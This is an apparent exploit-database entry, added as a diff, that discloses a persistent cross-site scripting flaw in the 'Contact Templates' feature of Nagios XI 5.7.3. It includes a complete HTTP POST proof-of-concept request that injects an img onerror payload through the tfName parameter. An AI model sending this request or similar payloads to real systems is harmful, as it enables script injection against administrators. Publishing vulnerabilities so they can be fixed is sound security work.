@@ -1,0 +1,34 @@
+# Exploit Title: Nagios XI 5.7.3 - 'Contact Templates' Persistent Cross-Site Scripting
+# Date: 10-18-2020
+# Exploit Author: Matthew Aberegg
+# Vendor Homepage: https://www.nagios.com/products/nagios-xi/
+# Vendor Changelog: https://www.nagios.com/downloads/nagios-xi/change-log/
+# Software Link: https://www.nagios.com/downloads/nagios-xi/
+# Version: Nagios XI 5.7.3
+# Tested on: Ubuntu 18.04
+
+
+# Vulnerability Details
+# Description : A persistent cross-site scripting vulnerability exists in the "Contact Templates" functionality of the Core Config Manager of Nagios XI.
+# Vulnerable Parameter : tfName
+
+
+# POC
+# Exploit Details : The following request will create a contact template with an XSS payload as the contact template name. Click on "Relationships" for the malicious template to trigger the payload.
+
+
+POST /nagiosxi/includes/components/ccm/index.php?type=contacttemplate&page=1 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 642
+Origin: http://TARGET
+Connection: close
+Referer: http://TARGET/nagiosxi/includes/components/ccm/index.php?cmd=modify&type=contacttemplate&id=7&page=1&returnUrl=index.php%3Fcmd%3Dview%26type%3Dcontacttemplate%26page%3D1
+Cookie: nagiosxi=a354rem56a8aoeieqr9k2le39i
+Upgrade-Insecure-Requests: 1
+
+tfName=<img+src=a+onerror=alert(1)>&tfFriendly=&tfEmail=&tfPager=&Active=1&tfAddress1=&tfAddress2=&tfAddress3=&tfAddress4=&tfAddress5=&tfAddress6=&radHostNotifEnabled=2&selHostPeriod=0&radStatusInfos=2&radNoStatusInfos=2&radServiceNotifEnabled=2&selServicePeriod=0&radCanSubCmds=2&radContactgroup=2&radServicecommand=2&radHostcommand=2&txtVariablename=&txtVariablevalue=&cmd=submit&mode=modify&hidId=7&hidName=test&hidServiceDescription=&hostAddress=127.0.0.1&exactType=contacttemplate&type=contacttemplate&genericType=contacttemplate&returnUrl=index.php%3Fcmd%3Dview%26type%3Dcontacttemplate%26page%3D1&token=3b8273eea1213ac4d2c1f3da1b0c370d
